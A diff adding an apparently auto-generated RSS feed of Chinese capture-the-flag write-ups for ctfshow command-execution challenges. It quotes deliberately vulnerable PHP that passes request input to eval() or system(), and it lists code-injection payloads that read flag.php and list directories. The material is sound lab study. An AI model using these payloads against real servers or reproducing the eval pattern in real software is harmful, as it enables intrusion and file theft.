@@ -1,0 +1,2206 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Web入门 on My New Hugo Site</title>
+    <link>http://localhost:1313/categories/web%E5%85%A5%E9%97%A8/</link>
+    <description>Recent content in Web入门 on My New Hugo Site</description>
+    <generator>Hugo -- 0.148.1</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 24 Mar 2025 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/categories/web%E5%85%A5%E9%97%A8/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Web71</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web71/</link>
+      <pubDate>Mon, 24 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web71/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250324082347661&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250324082347661.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，获得回显，下载源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+ini_set(&amp;#39;display_errors&amp;#39;, 0);
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+        $s = ob_get_contents();
+        ob_end_clean();
+        echo preg_replace(&amp;#34;/[0-9]|[a-z]/i&amp;#34;,&amp;#34;?&amp;#34;,$s);
+}else{
+    highlight_file(__FILE__);
+}
+
+?&amp;gt;
+
+你要上天吗？
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    <item>
+      <title>Web66</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/</link>
+      <pubDate>Sat, 22 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250322150905074&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322150905074.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;post传参&lt;code&gt;c=print_r(scandir(&#39;./&#39;));&lt;/code&gt;查看当前目录&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250322151752244&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322151752244.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;base64_php伪协议&lt;/strong&gt;查看flag.php&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250322152209416&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322152209416.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解码后发现被晃飞了&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250322152235585&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322152235585.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;目录扫描扫扫其他地方试试，发现flag.txt&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250322152415364&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322152415364.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;伪协议编码查看flag.txt&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250322155025669&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322155025669.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;解码后获得flag&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web67</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web67/</link>
+      <pubDate>Sat, 22 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web67/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250322155128448&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322155128448.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;与Web66类似，&lt;code&gt;print_r()&lt;/code&gt;被禁用，替换为&lt;code&gt;var_dump&lt;/code&gt;，其余不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web68</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web68/</link>
+      <pubDate>Sat, 22 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web68/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250322160814766&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322160814766.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;与67雷同，不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web69</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web69/</link>
+      <pubDate>Sat, 22 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web69/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250322162217477&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322162217477.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;与67雷同，不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web70</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web70/</link>
+      <pubDate>Sat, 22 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web70/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250322162608281&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322162608281.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;与67雷同，不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web61</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web61/</link>
+      <pubDate>Sat, 15 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web61/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250315151425867&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250315151425867.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;与Web58雷同，不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web62</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web62/</link>
+      <pubDate>Sat, 15 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web62/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250315152839289&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250315152839289.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;雷同58，此处补充一些常见读取文件命令及payload替代&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;file()&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//payload示例
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;highlight_file&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;highlight_file&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;($b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fgets&lt;/span&gt;($a)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $b;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//file()函数：把整个文件读入一个数组中
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;print_r&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;var_dump&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;readfile&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//一行一行读取
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;feof&lt;/span&gt;($a)) {$line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fgets&lt;/span&gt;($a);&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $line;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//一个一个字符读取
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;feof&lt;/span&gt;($a)) {$line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fgetc&lt;/span&gt;($a);&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $line;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;feof&lt;/span&gt;($a)) {$line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fgetcsv&lt;/span&gt;($a);&lt;span style=&#34;color:#a6e22e&#34;&gt;var_dump&lt;/span&gt;($line);}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;file_get_contents()&lt;/code&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web63</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web63/</link>
+      <pubDate>Sat, 15 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web63/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250315155824540&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250315155824540.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;与Web58雷同，不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web65</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web65/</link>
+      <pubDate>Sat, 15 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web65/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250315155851124&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250315155851124.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST[&amp;#39;c&amp;#39;])){
+        $c= $_POST[&amp;#39;c&amp;#39;];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;p&gt;与Web58雷同，不再赘述&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web56</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/</link>
+      <pubDate>Thu, 13 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250313151547403&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250313151547403.png&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;p&gt;linux文件上传,&lt;code&gt;.&lt;/code&gt;读取，&lt;code&gt;glob&lt;/code&gt;正则&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x01&#34;&gt;0x01&lt;/h2&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c=$_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/\;|[a-z]|[0-9]|\\$|\(|\{|\&amp;#39;|\&amp;#34;|\`|\%|\x09|\x26|\&amp;gt;|\&amp;lt;/i&amp;#34;, $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x02&#34;&gt;0x02&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!NOTe]&lt;/p&gt;
+&lt;p&gt;源码审计&lt;/p&gt;
+&lt;p&gt;过滤字段新增&lt;code&gt;&amp;quot;&amp;quot; &#39;&lt;/code&gt;及&lt;code&gt;[0-9]&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
